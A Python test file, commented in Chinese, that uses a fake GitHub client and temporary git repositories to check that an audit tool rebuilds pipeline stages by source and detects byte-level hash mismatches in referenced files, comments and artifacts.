"""T401 审计引用复原与哈希核对测试：假平台（假 gh + 本地 bare remote + 匿名临时 git 仓库）提供运行
记录、CI/route 事件包、评审评论、合并事实与 harness-audit 账本，复原各阶段输入输出决定与
local/ci/github 来源且链头一致；git 文件/评审评论/API 快照/本机产物/CI 安全 JSON 逐类按原始字节核对
哈希与大小（结尾换行变化也检测，common.git 式去尾换行或换规范化都会让本文件失败）；内容修改、本机
产物到期、CI artifact 到期与 API 无权限产生彼此不同的 findings，不报全通过；批量分页/日期边界、
恶意 path 与 URL 安全拒绝、引用内容不执行、CLI 退出码 0/1/2 明确。

夹具沿用 tests/test_audit_ledger.py 与 tests/test_trace_events_cli.py 的模式：隔离 events_db.ROOT、
递增冻结时钟、假 gh 桩（记录全部调用，分页页容量可调、故障可注入）；运行记录由 T201 真实生产者组装、
CI 包由真实 emit + ci_events.export 在项目分支 head 上生成（origin 暂指 GitHub URL 以通过 C5 来源
核对）、评审审计标记由 T105 真实生产者构造、账本与锚点评论由 T305 真实 writer 发布——生产者/消费者
任一方漂移形状都会让本文件失败。不碰真实库/PR/工作流，不调用真 gh。
"""

from __future__ import annotations

import contextlib
import copy
import hashlib
import io
import itertools
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
import urllib.parse
import zipfile
from datetime import UTC, datetime, timedelta
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from engine import cli
from engine.agents import dispatch_observation, run_timeline
from engine.core import events, events_db
from engine.reports import audit, ci_events, ledger

GIT_ENV = {
    "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com",
    "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.com",
    "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1",
}
CLEAN_PREFIXES = ("GIT_", "GITHUB_", "GH_", "HARNESS_", "CI")
REPO = "owner/repo"
GITHUB_URL = f"https://github.com/{REPO}.git"
BRANCH = "task/401-fixture"
TASKBOOK = "docs/plans/task-401-audit-reconstruction.md"
RECORD_PATH = "docs/runs/task-401-audit-reconstruction/1.json"
PR_TITLE = "feat：审计引用复原与哈希核对"
PR_BODY = "审计命令正文（夹具）。"
MERGED_AT = "2026-03-04T05:06:07Z"
TS = "2026-01-02T00:01:00.000Z"
LEDGER_PATH = f"{MERGED_AT[:4]}/401.json"


def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def canonical(data) -> str:
    return json.dumps(data, sort_keys=True, separators=(",", ":"), ensure_ascii=False)


def zip_bytes(members: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, content in members.items():
            archive.writestr(name, content)
    return buffer.getvalue()


def zip_member(data: bytes) -> str:
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        name = next(item for item in archive.namelist() if item.endswith(".json"))
        return archive.read(name).decode("utf-8")


class _Clock:
    """递增冻结时钟：从 2026-01-02T00:01Z 起每次调用前进一分钟，ts 严格递增且可解析。"""

    def __init__(self):
        self.step = 0

    def __call__(self) -> str:
        self.step += 1
        moment = datetime(2026, 1, 2, tzinfo=UTC) + timedelta(minutes=self.step)
        return moment.isoformat(timespec="milliseconds").replace("+00:00", "Z")


class FakeGh:
    """audit/ledger/load_ci/sync 共用 gh 桩：只读 API、artifact zip 下载与锚点评论写操作。

    page_size 模拟更小的服务端页容量（迫使真实翻页）；fail 里的子串命中即抛 RuntimeError；
    closed 是批量模式的已关闭 PR 列表（裸数组分页）；writes 单独记账评论写操作。
    """

    def __init__(self, *, repo=REPO, pulls=None, closed=None, reviews=None, pr_commits=None,
                 commits=None, comments=None, issues=None, runs=None, artifacts=None,
                 downloads=None, page_size=None, fail=()):
        self.calls: list[tuple] = []
        self.writes: list[tuple] = []
        self._repo = repo
        self.pulls = pulls or {}
        self.closed = list(closed or [])
        self.reviews = reviews or {}
        self.pr_commits = pr_commits or {}
        self.commits = commits or {}
        self.comments = list(comments or [])
        self.issues = issues or {}
        self.runs = runs or []
        self.artifacts = artifacts or {}
        self.downloads = downloads or {}
        self.page_size = page_size
        self.fail = tuple(fail)

    def repo(self) -> str:
        self.calls.append(("repo",))
        return self._repo

    def pr(self, pr: int) -> dict:
        self.calls.append(("pr", pr))
        pull = self.pulls.get(pr)
        if pull is None:
            raise RuntimeError(f"HTTP 404: Not Found（夹具无 PR {pr}）")
        return {"headRefName": pull["head"]["ref"], "headRefOid": pull["head"]["sha"],
                "repository": self._repo}

    def api(self, route: str, *, method: str = "GET", payload=None):
        self.calls.append((method, route))
        if method != "GET":
            return self._write(route, payload)
        for pattern in self.fail:
            if pattern in route:
                raise RuntimeError("HTTP 403: 权限不足（夹具）")
        path, _, query = route.partition("?")
        if match := re.fullmatch(r"repos/[^/]+/[^/]+/pulls/(\d+)", path):
            pull = self.pulls.get(int(match[1]))
            if pull is None:
                raise RuntimeError(f"HTTP 404: Not Found（夹具无 PR {match[1]}）")
            return pull
        if re.fullmatch(r"repos/[^/]+/[^/]+/pulls", path):
            return self._page(self.closed, query)
        if match := re.fullmatch(r"repos/[^/]+/[^/]+/pulls/(\d+)/reviews", path):
            return self._page(self.reviews.get(int(match[1]), []), query)
        if match := re.fullmatch(r"repos/[^/]+/[^/]+/pulls/(\d+)/commits", path):
            return self._page(self.pr_commits.get(int(match[1]), []), query)
        if match := re.fullmatch(r"repos/[^/]+/[^/]+/commits/([0-9a-f]+)", path):
            commit = self.commits.get(match[1])
            if commit is None:
                raise RuntimeError(f"HTTP 404: Not Found（夹具无提交 {match[1][:12]}）")
            return commit
        if match := re.fullmatch(r"repos/[^/]+/[^/]+/issues/(\d+)/comments", path):
            return self._page(self.comments, query)
        if match := re.fullmatch(r"repos/[^/]+/[^/]+/issues/comments/(\d+)", path):
            comment = next((item for item in self.comments if item.get("id") == int(match[1])), None)
            if comment is None:
                raise RuntimeError(f"HTTP 404: Not Found（夹具无评论 {match[1]}）")
            return comment
        if re.fullmatch(r"repos/[^/]+/[^/]+/issues", path):
            label = urllib.parse.parse_qs(query).get("labels", [""])[0]
            return self._page(self.issues.get(label, []), query)
        if re.fullmatch(r"repos/[^/]+/[^/]+/actions/runs", path):
            branch = urllib.parse.unquote(urllib.parse.parse_qs(query).get("branch", [""])[0])
            items = [item for item in self.runs if not branch or item.get("head_branch") == branch]
            return {"total_count": len(items), "workflow_runs": self._page(items, query)}
        if match := re.fullmatch(r"repos/[^/]+/[^/]+/actions/runs/(\d+)/artifacts", path):
            items = self.artifacts.get(int(match[1]), [])
            return {"total_count": len(items), "artifacts": self._page(items, query)}
        raise AssertionError(f"FakeGh 未配置的路由：{path}")

    def _write(self, route: str, payload) -> dict:
        """锚点评论写操作：只允许 POST issues/N/comments；记录进 writes 与 comments。"""
        path = route.partition("?")[0]
        if re.fullmatch(r"repos/[^/]+/[^/]+/issues/\d+/comments", path):
            self.writes.append(("POST", route, payload))
            comment = {"id": 9000 + len(self.comments), "body": payload["body"], "created_at": TS,
                       "html_url": f"{GITHUB_URL}/issues/comments/{9000 + len(self.comments)}"}
            self.comments.append(comment)
            return comment
        raise AssertionError(f"FakeGh 不允许的写路由：{route}")

    def download(self, url: str) -> bytes:
        self.calls.append(("download", url))
        return self.downloads[url]

    def _page(self, items: list, query: str) -> list:
        params = urllib.parse.parse_qs(query)
        page = int(params.get("page", ["1"])[0])
        cap = min(self.page_size or int(params.get("per_page", ["30"])[0]),
                  int(params.get("per_page", ["30"])[0]))
        return items[(page - 1) * cap:page * cap]


class ObservabilityTaskTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="dh-audit-reconstruction-"))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        clock = mock.patch.object(events_db, "_now", new=_Clock())
        clock.start()
        self.addCleanup(clock.stop)
        env_patch = mock.patch.dict(os.environ)
        env_patch.start()
        self.addCleanup(env_patch.stop)
        for key in [name for name in os.environ if name.startswith(CLEAN_PREFIXES)]:
            os.environ.pop(key, None)
        for key, value in GIT_ENV.items():
            os.environ[key] = value
        events._warned = False
        self.addCleanup(setattr, events, "_warned", False)
        self._seq = itertools.count()

    # ---- 基础夹具 ----

    def git(self, *args: str, cwd: Path, check: bool = True) -> str:
        done = subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True, check=False)
        if check and done.returncode != 0:
            raise AssertionError(f"git {' '.join(args)} 失败：{done.stderr}")
        return done.stdout.strip()

    def fresh_repo(self, name: str) -> Path:
        path = self.tmp / f"{name}-{next(self._seq)}"
        path.mkdir()
        self.git("init", "-q", "-b", "main", cwd=path)
        (path / "README.md").write_text("# fixture\n", encoding="utf-8")
        (path / TASKBOOK).parent.mkdir(parents=True, exist_ok=True)
        (path / TASKBOOK).write_text("task：T401 审计引用复原与哈希核对（夹具任务书）\n", encoding="utf-8")
        self.git("add", "-A", cwd=path)
        self.git("commit", "-q", "-m", "init", cwd=path)
        return path

    def bare_origin(self, project: Path) -> Path:
        origin = self.tmp / f"{project.name}-origin.git"
        self.git("init", "--bare", "-q", "--initial-branch=main", str(origin), cwd=project)
        self.git("remote", "add", "origin", str(origin), cwd=project)
        return origin

    def use_root(self, project: Path) -> None:
        patch = mock.patch.object(events_db, "ROOT", project)
        patch.start()
        self.addCleanup(patch.stop)

    def build_project(self, *, corrupt_log_hash: bool = False) -> SimpleNamespace:
        """项目仓库：main（含任务书）+ 任务分支（本机事件与运行记录）+ --no-ff 合并 + bare origin。

        corrupt_log_hash 时 verify 事件的输出三元字段记录被篡改的哈希（真实字节去掉结尾换行的摘要），
        产物文件本身仍是原始内容——模拟生产方记错哈希的输出引用。
        """
        project = self.fresh_repo("app")
        origin = self.bare_origin(project)
        self.use_root(project)
        base = self.git("rev-parse", "HEAD", cwd=project)
        self.git("checkout", "-q", "-b", BRANCH, cwd=project)
        task_raw = (project / TASKBOOK).read_bytes()
        self.assertIsNotNone(events.emit(
            "dispatch", "admit", "ok", trace_id=BRANCH, duration_ms=5,
            inputs=[events.ref("taskbook", f"{TASKBOOK}@{base}", sha256=digest(task_raw),
                               size=len(task_raw))],
            decision={"by": "taskbook", "rule": "admit", "reason": "ok"}))
        stored = events.store_artifact(b"verify log 401\n")
        log_sha, log_size = stored["sha256"], stored["size"]
        if corrupt_log_hash:  # 记录的期望哈希是「去掉结尾换行」的字节摘要，文件未变
            log_sha, log_size = digest(b"verify log 401"), len(b"verify log 401")
        self.assertIsNotNone(events.emit(
            "verify", "verify.tests", "ok", trace_id=BRANCH, duration_ms=10,
            outputs={"log.sha256": log_sha, "log.size": log_size, "log.ref": stored["ref"]}))
        timeline, head_hash = run_timeline.record_fields(BRANCH)
        self.assertTrue(head_hash)
        run_timeline.fix_anchor(BRANCH, head_hash)
        record = {"task": "task-401-audit-reconstruction", "class": "K7", "attempt": 1, "branch": BRANCH,
                  "started_at": TS, "ended_at": TS, "exit": "ok", **timeline}
        path = project / RECORD_PATH
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(record, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        self.git("add", "-A", cwd=project)
        self.git("commit", "-q", "-m", "run：task-401 派发记录", cwd=project)
        branch_head = self.git("rev-parse", "HEAD", cwd=project)
        self.git("checkout", "-q", "main", cwd=project)
        self.git("merge", "--no-ff", "-q", "-m", f"Merge pull request #401 from {BRANCH}\n\nbody",
                 BRANCH, cwd=project)
        merge_sha = self.git("rev-parse", "HEAD", cwd=project)
        self.git("push", "-q", "origin", "main", cwd=project)
        return SimpleNamespace(project=project, origin=origin, base=base, branch_head=branch_head,
                               merge_sha=merge_sha, stored=stored)

    def build_ci_packages(self, project: Path, branch_head: str) -> dict[str, bytes]:
        """在项目分支 head 上以 CI 身份生成两个 run 的事件包（真实 emit + ci_events.export）。

        origin 暂指 GitHub URL 使包 origin 能通过 C5 来源核对（run head 即 PR head）；事件进项目库，
        下载导入按事件哈希幂等跳过，与真实「导入后查询」同一形状。
        """
        real_url = self.git("remote", "get-url", "origin", cwd=project)
        self.git("remote", "set-url", "origin", GITHUB_URL, cwd=project)
        self.git("checkout", "-q", "--detach", branch_head, cwd=project)
        try:
            packages: dict[str, bytes] = {}
            for run_id, job, steps in (("9001", "job_x", (("verify", "tests", "ok"),)),
                                       ("9002", "job_y", (("route", "facts", "ok"),
                                                          ("route", "result", "ok")))):
                for key, value in (("CI", "true"), ("GITHUB_HEAD_REF", BRANCH), ("GITHUB_RUN_ID", run_id),
                                   ("GITHUB_RUN_ATTEMPT", "1"), ("GITHUB_JOB", job)):
                    os.environ[key] = value
                for stage, step, status in steps:
                    outputs = {"risk": "R3", "machine_class": "K7"} if step == "facts" else None
                    self.assertIsNotNone(events.emit(stage, step, status, trace_id=BRANCH,
                                                     duration_ms=7, outputs=outputs))
                target = self.tmp / f"exp-{run_id}-{job}-{next(self._seq)}"
                out, err = io.StringIO(), io.StringIO()
                with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
                    self.assertEqual(ci_events.export_main(["--target", str(target)]), 0, err.getvalue())
                name = f"harness-events-{run_id}-1-{job}"
                content = (target / "harness-events.json").read_text(encoding="utf-8")
                packages[name] = zip_bytes({f"{name}/harness-events.json": content})
        finally:
            for key in [name for name in os.environ if name.startswith(("GITHUB_", "CI"))]:
                os.environ.pop(key, None)
            self.git("checkout", "-q", "main", cwd=project)
            self.git("remote", "set-url", "origin", real_url, cwd=project)
        return packages

    def ci_platform(self, head: str, packages: dict[str, bytes], *, extra_runs=(),
                    extra_artifacts=None, extra_downloads=None):
        """把 CI 事件包接上假平台：两个独立 run 各带自己的事件包 artifact。"""
        runs = [{"id": 9001, "run_attempt": 1, "headSha": head, "head_branch": BRANCH,
                 "path": ".github/workflows/harness.yml"},
                {"id": 9002, "run_attempt": 1, "headSha": head, "head_branch": BRANCH,
                 "path": ".github/workflows/harness.yml"}, *extra_runs]
        artifacts = {9001: [{"id": 1, "name": name, "expired": False,
                             "archive_download_url": f"https://dl/{name}"}
                            for name in packages if name.startswith("harness-events-9001")],
                     9002: [{"id": 2, "name": name, "expired": False,
                             "archive_download_url": f"https://dl/{name}"}
                            for name in packages if name.startswith("harness-events-9002")]}
        downloads = {f"https://dl/{name}": data for name, data in packages.items()}
        artifacts.update(extra_artifacts or {})
        downloads.update(extra_downloads or {})
        return runs, artifacts, downloads

    def ci_evidence(self, fx: SimpleNamespace, **kwargs):
        """一个世界的完整 CI 证据（包 + 平台三元组），多个用例共用。"""
        packages = self.build_ci_packages(fx.project, fx.branch_head)
        return packages, self.ci_platform(fx.branch_head, packages, **kwargs)

    def review_files(self, fx: SimpleNamespace) -> Path:
        """评审工作区材料文件（与 review.py write_materials 同一布局）；返回 build/review 目录。"""
        folder = fx.project / "build" / "review"
        folder.mkdir(parents=True, exist_ok=True)
        (folder / "task.md").write_bytes((fx.project / TASKBOOK).read_bytes())
        (folder / "diff.patch").write_text("diff --git a/a b/a\n", encoding="utf-8")
        (folder / "ci.md").write_text("CI 摘要", encoding="utf-8")
        (folder / "pr.md").write_text(f"# {PR_TITLE}\n\n{PR_BODY}", encoding="utf-8")
        (folder / "pack.md").write_text("评审包", encoding="utf-8")
        return folder

    def review_comment(self, fx: SimpleNamespace, materials=None) -> str:
        """T105 真实生产者构造的评审评论体（independent-review 标记旁列 harness-review-audit 摘要）。"""
        self.review_files(fx)
        mats = materials if materials is not None else dispatch_observation.review_materials(
            fx.project, fx.base, fx.branch_head, TASKBOOK, 401)
        summary = dispatch_observation.review_audit(
            trace_id=BRANCH, head=fx.branch_head, base=fx.base, reviewer="opencode", model="review-model/1",
            model_basis="reported", designer="codex", implementers=["pi"], independent=True,
            same_host=False, parsed=True, verdict="通过", duration_ms=60000,
            findings=[{"severity": "一般", "location": "engine/x.py:12", "problem": "边界说明",
                       "fix": "补断言"}],
            materials=mats)
        legacy = json.dumps({"verdict": "通过", "reviewer": "opencode", "head": fx.branch_head},
                            ensure_ascii=False)
        return ("### 独立评审（试行）：通过\n\n"
                f"<!-- independent-review {legacy} -->\n"
                f"<!-- harness-review-audit {json.dumps(summary, ensure_ascii=False)} -->\n")

    @staticmethod
    def merged_pull(number: int, *, head: str, merge_sha: str, merged_at: str = MERGED_AT,
                    merged: bool = True, branch: str = BRANCH, title: str = PR_TITLE) -> dict:
        return {"number": number, "state": "closed" if merged else "open", "merged": merged,
                "merged_at": merged_at if merged else None,
                "merge_commit_sha": merge_sha if merged else None,
                "title": title, "body": PR_BODY,
                "head": {"ref": branch, "sha": head},
                "merged_by": {"login": "alice", "type": "User"}}

    @staticmethod
    def as_comment(comment_id: int, body: str) -> dict:
        return {"id": comment_id, "body": body, "created_at": TS,
                "html_url": f"{GITHUB_URL}/issues/comments/{comment_id}"}

    def platform(self, fx: SimpleNamespace, *, comments=(), runs=(), artifacts=None, downloads=None,
                 fail=(), page_size=None, title=PR_TITLE) -> FakeGh:
        """PR 401 的整套假平台：合并事实 + 人批准 + 无议题；评论/CI/标题/故障可配置。"""
        return FakeGh(
            pulls={401: self.merged_pull(401, head=fx.branch_head, merge_sha=fx.merge_sha, title=title)},
            reviews={401: [{"state": "APPROVED", "user": {"login": "alice", "type": "User"},
                            "commit_id": fx.branch_head}]},
            pr_commits={401: [{"sha": "x1"}, {"sha": "x2"}]},
            commits={fx.merge_sha: {"parents": [{"sha": "p1"}, {"sha": "p2"}]}},
            comments=list(comments), runs=list(runs), artifacts=dict(artifacts or {}),
            downloads=dict(downloads or {}), page_size=page_size, fail=fail)

    def push_ledger(self, origin: Path, data: bytes, pr: int, path: str) -> dict:
        """把账本字节直接提交到 bare origin 的 harness-audit 分支（plumbing），返回锚点评论。"""
        work = self.tmp / f"ledger-push-{pr}-{next(self._seq)}"
        work.mkdir()
        self.git("init", "-q", "-b", "main", cwd=work)
        self.git("remote", "add", "origin", str(origin), cwd=work)
        parents = []
        if self.git("ls-remote", str(origin), "refs/heads/harness-audit", cwd=work, check=False):
            self.git("fetch", "-q", "origin", "harness-audit", cwd=work)
            self.git("read-tree", "FETCH_HEAD^{tree}", cwd=work)
            parents = ["-p", "FETCH_HEAD"]
        else:
            self.git("read-tree", "--empty", cwd=work)
        blob = subprocess.run(["git", "hash-object", "-w", "--stdin"], cwd=work, input=data,
                              capture_output=True, check=True).stdout.decode().strip()
        self.git("update-index", "--add", "--cacheinfo", f"100644,{blob},{path}", cwd=work)
        tree = self.git("write-tree", cwd=work)
        commit = self.git("commit-tree", tree, "-m", f"audit：PR #{pr} 夹具账本（{path}）", *parents, cwd=work)
        self.git("push", "-q", "origin", f"{commit}:refs/heads/harness-audit", cwd=work)
        body = "\n".join([
            f"<!-- {ledger.ANCHOR_PREFIX}{pr} -->",
            "合并账本已固定（合并账本与链头锚点）：",
            f"- 分支：`{ledger.AUDIT_BRANCH}`",
            f"- 文件：`{path}` @ {commit}",
            f"- 文件 sha256：`{digest(data)}`",
            "- 链头：（无事件链）",
        ]) + "\n"
        return self.as_comment(7000 + pr, body)

    def git_bytes(self, project: Path, rev: str, path: str) -> bytes:
        done = subprocess.run(["git", "show", f"{rev}:{path}"], cwd=project, capture_output=True, check=True)
        return done.stdout

    def build_full_world(self, *, corrupt_log_hash: bool = False, comment: str | None = None,
                         **platform_kwargs) -> tuple[SimpleNamespace, FakeGh, str]:
        """全套证据的 401 号 PR 世界：项目 + CI 事件包 + 评审评论（可换）+ 平台桩。"""
        fx = self.build_project(corrupt_log_hash=corrupt_log_hash)
        _packages, (runs, artifacts, downloads) = self.ci_evidence(fx)
        body = comment if comment is not None else self.review_comment(fx)
        gh = self.platform(fx, comments=[self.as_comment(500, body)], runs=runs, artifacts=artifacts,
                           downloads=downloads, **platform_kwargs)
        return fx, gh, body

    def run_cli(self, *args: str) -> tuple[int, str, str]:
        """真实产品入口：捕获 stdout/stderr，返回（退出码, stdout, stderr）；argparse 的 SystemExit 转码。"""
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            try:
                code = cli.main(list(args))
            except SystemExit as exc:  # argparse 参数错误以 SystemExit(2) 抛出
                code = exc.code if isinstance(exc.code, int) else (0 if exc.code is None else 1)
        return code, out.getvalue(), err.getvalue()

    @contextlib.contextmanager
    def cli_env(self, gh=None, root=None):
        """audit CLI 的测试环境：注入假 gh 与夹具根目录（main 在调用时解析 ROOT）。"""
        with contextlib.ExitStack() as stack:
            if gh is not None:
                stack.enter_context(mock.patch.object(audit, "GhClient", lambda: gh))
            if root is not None:
                stack.enter_context(mock.patch.object(audit, "ROOT", root))
            yield

    def ref_by_ref(self, report: dict, ref: str) -> dict:
        return next(item for item in report["references"] if item["ref"] == ref)

    def mutated_materials(self, fx: SimpleNamespace, kind: str, sha256: str, size: int) -> list[dict]:
        """真实生产者的评审材料，把指定材料改成给定的哈希与大小（其余不动）。"""
        self.review_files(fx)
        mats = [dict(item) for item in dispatch_observation.review_materials(
            fx.project, fx.base, fx.branch_head, TASKBOOK, 401)]
        entry = next(item for item in mats if item["kind"] == kind)
        entry["sha256"], entry["size"] = sha256, size
        return mats

    # ---- 验收 1：复原每阶段输入输出决定与 local/ci/github 来源，链头一致 ----

    def test_rebuild_input_output_decisions_by_source(self):
        fx, gh, _body = self.build_full_world()
        report = audit.inspect_pr(401, gh=gh, cwd=fx.project)
        self.assertFalse([call for call in gh.calls if call[0] in ("POST", "PATCH")], "只读，不做写操作")

        # 顶层事实来自 API：trace/head/merge 与夹具一致
        self.assertEqual((report["pr"], report["repository"], report["trace_id"]), (401, REPO, BRANCH))
        self.assertEqual((report["head_sha"], report["merge_sha"], report["merged_at"]),
                         (fx.branch_head, fx.merge_sha, MERGED_AT))
        self.assertTrue(report["ok"], report["findings"])
        self.assertEqual(report["findings"], [])

        # 来源分类齐全且逐条一致：local/ci/github 不混合（事件按来源前缀；记录摘要属本机、评审摘要属
        # GitHub 评论——审计的 source_class 与证据所在地一致，不能互相混淆）
        classes = {stage["source_class"] for stage in report["stages"]}
        self.assertEqual(classes, {"local", "ci", "github"})
        for stage in report["stages"]:
            if stage["evidence"] == "event":
                expected = ("github" if stage["source"].startswith("github:")
                            else "ci" if stage["source"].startswith("ci") else "local")
            else:
                expected = "local" if stage["evidence"] == "run_record_summary" else "github"
            self.assertEqual(stage["source_class"], expected)

        # 本机阶段：输入引用、决定与输出三元字段都复原（不是只显示事件名）
        admit = next(item for item in report["stages"]
                     if (item["stage"], item["step"], item["evidence"]) == ("dispatch", "admit", "event"))
        self.assertEqual(admit["decision"], {"by": "taskbook", "rule": "admit", "reason": "ok"})
        self.assertEqual(admit["inputs"][0]["ref"], f"{TASKBOOK}@{fx.base}")
        self.assertEqual(admit["inputs"][0]["sha256"], digest((fx.project / TASKBOOK).read_bytes()))
        verify_stage = next(item for item in report["stages"]
                            if item["evidence"] == "event"
                            and (item["stage"], item["step"]) == ("verify", "verify.tests"))
        self.assertEqual(verify_stage["outputs"]["log.sha256"], fx.stored["sha256"])
        self.assertEqual(verify_stage["outputs"]["log.size"], fx.stored["size"])

        # CI 阶段：route.facts 输出机器判定，来源是独立 CI 链
        facts = next(item for item in report["stages"]
                     if item["evidence"] == "event"
                     and (item["stage"], item["step"]) == ("route", "facts"))
        self.assertEqual((facts["outputs"]["risk"], facts["outputs"]["machine_class"]), ("R3", "K7"))
        self.assertEqual(facts["source"], "ci:9002:1:job_y")

        # GitHub 阶段：合并事实（批准者）来自 T304 快照事件
        merge_stage = next(item for item in report["stages"]
                           if item["evidence"] == "event"
                           and (item["stage"], item["step"]) == ("merge", "github.merge"))
        self.assertEqual(merge_stage["outputs"]["approver"], "alice")
        self.assertEqual(merge_stage["outputs"]["approver_type"], "User")

        # 评审摘要与运行记录摘要各自在阶段视图里，head 与 API head 一致
        review = next(item for item in report["stages"] if item["evidence"] == "review_comment_summary")
        self.assertEqual((review["verdict"], review["reviewer"], review["head"]),
                         ("通过", "opencode", fx.branch_head))
        summaries = [item for item in report["stages"] if item["evidence"] == "run_record_summary"]
        self.assertEqual({item["step"] for item in summaries}, {"admit", "verify.tests"})

        # head 一致：报告的每条链链头与本机事件库实际链头一致
        self.assertTrue(report["chains"])
        for chain in report["chains"]:
            self.assertEqual(chain["trace_id"], BRANCH)
            self.assertEqual(chain["head_hash"], events_db.chain_head(chain["source"], BRANCH))
        sources = {chain["source"] for chain in report["chains"]}
        # local 一条 + CI 两条 + GitHub 快照两条（合并事实与抽审事实各一条不可变快照链）
        self.assertEqual(len(sources), 5)
        for source in ("local", "ci:9001:1:job_x", "ci:9002:1:job_y"):
            self.assertIn(source, sources)
        self.assertTrue(any(source.startswith("github:401:") for source in sources))
        self.assertTrue(any(item.get("fixed_in") == "run_record" for item in report["anchors"]))
        self.assertTrue(any(item.get("fixed_in") == "ci_artifact" for item in report["anchors"]))

        # 引用核对：事件输入的 git 文件与输出三元字段派生的本机产物都核对通过
        task_ref = self.ref_by_ref(report, f"{TASKBOOK}@{fx.base}")
        self.assertEqual((task_ref["status"], task_ref["expectation"]), ("verified", "event"))
        artifact_ref = self.ref_by_ref(report, fx.stored["ref"])
        self.assertEqual((artifact_ref["status"], artifact_ref["sha256"]), ("verified", fx.stored["sha256"]))
        self.assertEqual(artifact_ref["observed_sha256"], fx.stored["sha256"])
        self.assertEqual(report["coverage"]["references"]["verified"],
                         sum(1 for item in report["references"] if item["status"] == "verified"))
        # diff/ci 材料是评审时 recipe 渲染字节（C6），如实记不核对而不是冒充通过
        self.assertTrue(report["coverage"]["references"]["unchecked"] >= 2)
        self.assertEqual(report["coverage"]["ledger"], "absent")

    # ---- 验收 2：git 文件/评审评论/API 快照/本机产物/CI JSON 逐类原字节核对，结尾换行变化也检测 ----

    def test_each_reference_kind_matches_original_bytes(self):
        # 基线：账本与锚点评论由 T305 真实 writer 发布，五类引用全部核对通过
        fx, gh, body = self.build_full_world()
        built = ledger.build_ledger(401, gh=gh, cwd=fx.project)
        self.assertEqual(built["missing"], [])
        stub = FakeGh()
        published = ledger.publish_ledger(built, gh=stub)
        self.assertTrue(published["ok"], published["findings"])
        _packages, (runs, artifacts, downloads) = self.ci_evidence(fx)
        gh = self.platform(fx, comments=[self.as_comment(500, body), stub.comments[0]], runs=runs,
                           artifacts=artifacts, downloads=downloads)
        report = audit.inspect_pr(401, gh=gh, cwd=fx.project)
        self.assertTrue(report["ok"], report["findings"])
        by_kind = {item["kind"]: item for item in report["references"]}
        record_raw = self.git_bytes(fx.project, fx.merge_sha, RECORD_PATH)
        self.assertEqual(by_kind["run_record"]["status"], "verified")
        self.assertEqual(by_kind["run_record"]["observed_sha256"], digest(record_raw))
        self.assertEqual(by_kind["run_record"]["expectation"], "ledger")
        self.assertEqual(by_kind["review_comment"]["status"], "verified")
        self.assertEqual(by_kind["review_comment"]["observed_sha256"], digest(body.encode("utf-8")))
        self.assertEqual(by_kind["ledger"]["status"], "verified")
        self.assertEqual(by_kind["material_task"]["status"], "verified")
        self.assertEqual(by_kind["material_pack"]["status"], "verified")
        self.assertEqual(by_kind["material_pr"]["status"], "verified")
        self.assertEqual(report["coverage"]["ledger"], "verified")

        # (a) git 文件：任务书材料记录的哈希是「去掉结尾换行」的摘要 → 必须发现（证明不去尾、不再规范化）
        world = self.build_project()
        _packages, (runs, artifacts, downloads) = self.ci_evidence(world)
        task_bytes = (world.project / TASKBOOK).read_bytes()
        stripped = task_bytes[:-1]
        mats = self.mutated_materials(world, "task", digest(stripped), len(stripped))
        gh_a = self.platform(world, comments=[self.as_comment(500, self.review_comment(world, mats))],
                             runs=runs, artifacts=artifacts, downloads=downloads)
        report = audit.inspect_pr(401, gh=gh_a, cwd=world.project)
        task_ref = next(item for item in report["references"] if item["kind"] == "material_task")
        self.assertEqual(task_ref["status"], "hash_mismatch")
        finding = next(item for item in report["findings"] if item["ref"] == task_ref["ref"])
        self.assertEqual((finding["rule"], finding["source"], finding["stage"]),
                         ("hash_mismatch", "local", "review"))
        self.assertFalse(report["ok"])

        def ledger_world() -> tuple[SimpleNamespace, list, dict, dict, dict, str]:
            """带真实账本的世界：返回（fx, runs, artifacts, downloads, 账本副本, 评审评论体）。"""
            fx_l, gh_l, body_l = self.build_full_world()
            built_l = ledger.build_ledger(401, gh=gh_l, cwd=fx_l.project)
            self.assertEqual(built_l["missing"], [])
            _packages, (runs, artifacts, downloads) = self.ci_evidence(fx_l)
            return fx_l, runs, artifacts, downloads, copy.deepcopy(built_l), body_l

        def audit_with_ledger(fx_l, runs, artifacts, downloads, anchor: dict, body_l: str):
            gh_l = self.platform(fx_l, comments=[self.as_comment(500, body_l), anchor], runs=runs,
                                 artifacts=artifacts, downloads=downloads)
            return audit.inspect_pr(401, gh=gh_l, cwd=fx_l.project)

        # (b) 评审评论：账本记录的哈希是「去掉结尾换行」的正文摘要 → 逐字节比对必须发现
        fx2, runs, artifacts, downloads, mutated, body2 = ledger_world()
        ref = next(item for item in mutated["references"] if item["kind"] == "review_comment")
        ref["sha256"] = digest(body2.encode("utf-8")[:-1])
        ref["size"] = len(body2.encode("utf-8")) - 1
        anchor2 = self.push_ledger(fx2.origin, canonical(mutated).encode("utf-8") + b"\n", 401, LEDGER_PATH)
        report = audit_with_ledger(fx2, runs, artifacts, downloads, anchor2, body2)
        self.assertEqual(next(item for item in report["references"]
                              if item["kind"] == "ledger")["status"], "verified")
        comment_ref = next(item for item in report["references"] if item["kind"] == "review_comment")
        self.assertEqual(comment_ref["status"], "hash_mismatch")
        finding = next(item for item in report["findings"] if item["ref"] == comment_ref["ref"])
        self.assertEqual((finding["rule"], finding["source"], finding["stage"]),
                         ("hash_mismatch", "github", "review"))

